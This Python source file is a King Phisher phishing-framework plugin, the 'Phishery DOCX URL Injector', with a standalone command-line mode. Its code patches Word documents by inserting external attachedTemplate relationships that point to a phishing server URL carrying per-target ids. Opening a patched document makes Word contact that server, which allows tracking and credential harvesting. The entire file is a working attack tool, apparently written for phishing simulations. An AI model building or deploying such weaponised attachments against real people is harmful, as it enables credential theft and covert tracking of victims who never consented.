import argparse
import distutils.version
import os
import random
import urllib.parse
import zipfile

import king_phisher.archive as archive
import king_phisher.client.plugins as plugins
import king_phisher.version as version

PARSER_EPILOG = """\
If no output file is specified, the input file will be modified in place.
"""
min_version = '1.9.0'
StrictVersion = distutils.version.StrictVersion
api_compatible = StrictVersion(version.distutils_version) >= StrictVersion(min_version)

def path_is_doc_file(path):
	if os.path.splitext(path)[1] not in ('.docx', '.docm'):
		return False
	if not zipfile.is_zipfile(path):
		return False
	return True

def phishery_inject(input_file, document_urls, output_file=None):
	target_string = '<Relationship Id="{rid}" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="{target_url}" TargetMode="External"/>'
	input_file = os.path.abspath(input_file)
	document_urls = document_urls.split()
	rids = []
	while len(rids) < len(document_urls):
		rid = 'rId' + str(random.randint(10000, 99999))
		if rid not in rids:
			rids.append(rid)

	settings = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\r\n'
	settings += '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
	for rid, url in zip(rids, document_urls):
		settings += target_string.format(rid=rid, target_url=url)
	settings += '</Relationships>'

	patches = {}
	patches['word/_rels/settings.xml.rels'] = settings
	with zipfile.ZipFile(input_file, 'r') as zin:
		settings = zin.read('word/settings.xml')
	settings = settings.decode('utf-8')
	for rid in rids:
		settings = settings.replace('/><w', "/><w:attachedTemplate r:id=\"{0}\"/><w".format(rid), 1)
	patches['word/settings.xml'] = settings
	archive.patch_zipfile(input_file, patches, output_file=output_file)

class Plugin(getattr(plugins, 'ClientPluginMailerAttachment', plugins.ClientPlugin)):
	authors = ['Ryan Hanson', 'Spencer McIntyre', 'Erik Daguerre']
	classifiers = [
		'Plugin :: Client :: Email :: Attachment',
		'Script :: CLI'
	]
	title = 'Phishery DOCX URL Injector'
	description = """
	Inject Word Document Template URLs into DOCX files. The Phishery technique
	is used to place multiple document template URLs into the word document (one
	per-line from the plugin settings).
	"""
	homepage = 'https://github.com/securestate/king-phisher-plugins'
	options = [
		plugins.ClientOptionString(
			'target_url',
			'An optional target URLs. The default is the phishing URLs.',
			default='{{ url.webserver }}',
			display_name='Target URLs',
			**({'multiline': True} if api_compatible else {})
		),
		plugins.ClientOptionBoolean(
			'add_landing_pages',
			'Add all document URLs as landing pages to track visits.',
			default=True,
			display_name='Add Landing Pages'
		)
	]
	reference_urls = ['https://github.com/ryhanson/phishery']
	req_min_version = min_version
	version = '2.2.0'
	def initialize(self):
		mailer_tab = self.application.main_tabs['mailer']
		self.text_insert = mailer_tab.tabs['send_messages'].text_insert
		self.signal_connect('send-precheck', self.signal_send_precheck, gobject=mailer_tab)
		return True

	def _get_target_url(self, target):
		target_url = self.config['target_url'].strip()
		if target_url:
			return self.render_template_string(target_url, target=target, description='target url')
		target_url = self.application.config['mailer.webserver_url']
		if target is not None:
			target_url += '?id=' + target.uid
		return target_url

	def process_attachment_file(self, input_path, output_path, target=None):
		if not path_is_doc_file(input_path):
			return
		target_url = self._get_target_url(target)
		if target_url is None:
			self.logger.warning('failed to get the target url, can not inject into the docx file')
			return
		phishery_inject(input_path, target_url, output_file=output_path)
		self.logger.info('wrote the patched file to: ' + output_path + ('' if target is None else ' with uid: ' + target.uid))

	def signal_send_precheck(self, _):
		input_path = self.application.config['mailer.attachment_file']
		if not path_is_doc_file(input_path):
			self.text_insert('The attachment is not compatible with the phishery plugin.\n')
			return False
		target_url = self._get_target_url(None)
		if target_url is None:
			self.text_insert('The phishery target URL is invalid.\n')
			return False

		if not self.config['add_landing_pages']:
			return True
		document_urls = target_url.split()
		for document_url in document_urls:
			parsed_url = urllib.parse.urlparse(document_url)
			hostname = parsed_url.netloc
			landing_page = parsed_url.path
			landing_page.lstrip('/')
			self.application.rpc('campaign/landing_page/new', self.application.config['campaign_id'], hostname, landing_page)
		return True

def main():
	parser = argparse.ArgumentParser(description='Phishery DOCX URL Injector Utility', conflict_handler='resolve')
	parser.add_argument('-i', '--input', dest='input_file', required=True, help='the input file to inject into')
	parser.add_argument('-o', '--output', dest='output_file', help='the output file to write')
	parser.add_argument('-u', '--url', dest='target_url', required=True, help='the target url to inject into the input file')
	parser.epilog = PARSER_EPILOG
	arguments = parser.parse_args()

	phishery_inject(arguments.input_file, arguments.target_url, output_file=arguments.output_file)

if __name__ == '__main__':
	main()
